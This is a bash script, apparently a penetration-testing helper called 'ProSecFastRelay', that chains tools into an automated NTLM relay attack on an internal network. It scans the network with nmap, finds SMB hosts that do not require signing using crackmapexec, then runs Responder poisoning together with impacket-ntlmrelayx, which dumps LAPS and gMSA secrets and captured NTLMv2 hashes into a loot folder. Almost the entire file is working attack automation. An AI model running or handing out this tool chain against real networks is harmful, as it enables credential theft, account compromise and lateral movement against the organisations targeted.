#!/bin/bash

figlet ProSecFastRelay

if [ -s /root/input/ipint.txt ]; then
  echo '! >ipint.txt exists.'
else
  echo '! > ipint.txt missing in /root/input/ipint.txt.'
  exit 1
fi

echo 'Start fast_relay' >>/root/output/runtime.txt
date >>/root/output/runtime.txt

#NMAP PE SCAN
if [ -s /root/output/list/ipup.txt ]; then
  echo '! > nmap PE already done'
else
  nmap -PE -sn -n --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/pe -iL /root/input/ipint.txt >/dev/null 2>&1

  awk '/Up/ {print$2}' /root/output/nmap/pe.gnmap >/root/output/list/ipup.txt
fi

if [ -f /root/output/list/smb_open.txt ]; then
  echo '! > SMB Open File exists'
else
  nmap -p 445 --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/445 -iL /root/output/list/ipup.txt >/dev/null 2>&1

  awk '/open/ {print$2}' /root/output/nmap/445.gnmap >/root/output/list/smb_open.txt
fi

if [ -s /root/output/list/smb_open.txt ]; then
  echo '! > Hosts to target, CME is next!'
else
  echo '! > no smb HOSTS!'
  exit 1
fi

if [ -f /root/output/list/smb_sign_off.txt ]; then
  echo '! > SMB Signing List exist.'
else
  crackmapexec smb /root/output/list/smb_open.txt --gen-relay-list /root/output/list/smb_sign_off.txt >/root/output/cme_beauty.txt
fi

if [ -s /root/output/list/smb_sign_off.txt ]; then
  echo '! > SMB Signing List already exist, Responder and NTLMRELAY are next!'
else
  echo '! > No no-signing HOSTS!'
  exit 1
fi

#Responder with 300sec timeout in bg
echo '! > Starting impacket-ntlmrelayx && Responder'
#Python unbuffered for logging to file
export PYTHONUNBUFFERED=TRUE

timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt -smb2support -tf /root/output/list/smb_sign_off.txt &>/root/output/relay.txt &
sleep 5
timeout 300 responder -I eth0 -wvFP &>/root/output/responder.txt &

PID_RELAY=$(jobs -l | awk '/ntlmrelayx/ {print$2}')
PID_RESPONDER=$(jobs -l | awk '/responder/ {print$2}')

wait "$PID_RESPONDER"
wait "$PID_RELAY"

#Python unbuffered reset to default
unset PYTHONUNBUFFERED

echo 'END Fast Relay' >>/root/output/runtime.txt
date >>/root/output/runtime.txt

if [ -s /root/output/loot/ntlm_relay_ntlmv2.txt ]; then
  echo '! > Got Hashes!'
  exit 0
else
  echo '! >> No Hashes Found'
  exit 1
fi
